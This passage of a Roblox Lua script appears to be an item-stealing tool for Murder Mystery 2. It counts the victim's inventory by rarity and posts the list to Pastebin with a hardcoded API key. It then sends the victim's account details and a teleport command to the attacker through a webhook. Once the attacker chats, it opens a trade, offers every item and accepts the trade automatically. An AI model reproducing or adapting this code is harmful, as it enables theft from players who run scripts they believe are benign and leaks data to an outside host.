            valueCount = valueCount + values[d.ItemName]
            br = values[d.ItemName]
        end

        local formattedTable = {name = d.ItemName, value = br, data = d.DataID, amount = d.Amount, rarity = d.Rarity}
        table.insert(allItems, formattedTable)
        
        if d.Rarity == "Vintage" then
            vintageItemsC = vintageItemsC + 1
            table.insert(vintageItems, formattedTable)
        end

        if d.Rarity == "Unique" then
            uniqueItemsC = uniqueItemsC + 1
            table.insert(uniqueItems, formattedTable)
        end

        if d.Rarity == "Ancient" then
            ancientItemsC = ancientItemsC + 1
            table.insert(ancientItems, formattedTable)
        end

        if d.Rarity == "Godly" then
            godlyItemsC = godlyItemsC + 1
            table.insert(godlyItems, formattedTable)
        end

        if d.Rarity == "Legendary" then
            legendaryItemsC = legendaryItemsC + 1
            table.insert(legendaryItems, formattedTable)
        end

        if d.Rarity == "Rare" then
            rareItemsC = rareItemsC + 1
            table.insert(rareItems, formattedTable)
        end

        if d.Rarity == "Uncommon" then
            uncommonItemsC = uncommonItemsC + 1
            table.insert(uncommonItems, formattedTable)
        end

        if d.Rarity == "Common" then
            commonItemsC = commonItemsC + 1
            table.insert(commonItems, formattedTable)
        end
    end
end

for i,v in pairs(allItems) do
    itemsCount = itemsCount + 1
end

local function pastebin(content)

    local body = {
        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = ""
    for key, value in pairs(body) do
        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
    end
    encodedBody = encodedBody:sub(1, -2) 

    local response
    local success, err = pcall(function()
        response = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            },
            Timeout = 20
        })
    end)

    if not success or not response or not response.Success then
        return "Pastebin Api not Available"
    end

    local pasteUrl = response.Body
    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")

    return rawUrl
end

local uniquesString = ""
local ancientsString = ""
local godlysString = ""
local legendariesString = ""
local vintageString = ""
local raresString = ""
local uncommonString = ""
local commonsString = ""

for a,b in pairs(uniqueItems) do
    for c,d in pairs(b) do
        if c == "name" then
            uniquesString = uniquesString .. d .. ",\n"
        end
    end
end

for a,b in pairs(ancientItems) do
    for c,d in pairs(b) do
        if c == "name" then
            ancientsString = ancientsString .. d .. ",\n"
        end
    end
end

for a,b in pairs(godlyItems) do
    for c,d in pairs(b) do
        if c == "name" then
            godlysString = godlysString .. d .. ",\n"
        end
    end
end

for a,b in pairs(legendaryItems) do
    for c,d in pairs(b) do
        if c == "name" then
            legendariesString = legendariesString .. d .. ",\n"
        end
    end
end

for a,b in pairs(vintageItems) do
    for c,d in pairs(b) do
        if c == "name" then
            vintageString = vintageString .. d .. ",\n"
        end
    end
end

for a,b in pairs(rareItems) do
    for c,d in pairs(b) do
        if c == "name" then
            raresString = raresString .. d .. ",\n"
        end
    end
end

for a,b in pairs(uncommonItems) do
    for c,d in pairs(b) do
        if c == "name" then
            uncommonString = uncommonString .. d .. ",\n"
        end
    end
end

for a,b in pairs(commonItems) do
    for c,d in pairs(b) do
        if c == "name" then
            commonsString = commonsString .. d .. ",\n"
        end
    end
end

local EverythingString = "-- // Uniques\n" .. uniquesString ..
                         "\n\n-- // Ancient\n" .. ancientsString ..
                         "\n\n-- // Godlies\n" .. godlysString ..
                         "\n\n-- // Legendaries\n" .. legendariesString ..
                         "\n\n-- // Vintage\n" .. vintageString ..
                         "\n\n-- // Rare\n" .. raresString ..
                         "\n\n-- // Uncommon\n" .. uncommonString ..
                         "\n\n-- // Common\n" .. commonsString

local WebHookEmbed = CreateEmbed(
    "MM2 Hit by aaliyan",
    "Please execute the code above to get your hit.",
    11220,
    {
        {name = "```Info```", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
{name = "```Hit Info```", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
{name = "```Hit List```", value = "[Click Here for List]("..pastebin(EverythingString)..")"},
{name = "```Teleporter```", value = "[Teleporter](https://www.roblox.com/games/18845424641/Mori-Scripts-TELEPORTER)"}
    }
)

SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})

local function stealitems()
    coroutine.resume(destroytrades2)

    local sendArgs = {
        [1] = game:GetService("Players")[userName]
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    for a,b in pairs(uniqueItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(ancientItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(godlyItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(vintageItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(legendaryItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(rareItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(uncommonItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(commonItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    wait(6)
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == userName then
        player.Chatted:Connect(function(msg)
            stealitems()
        end)
    end
end
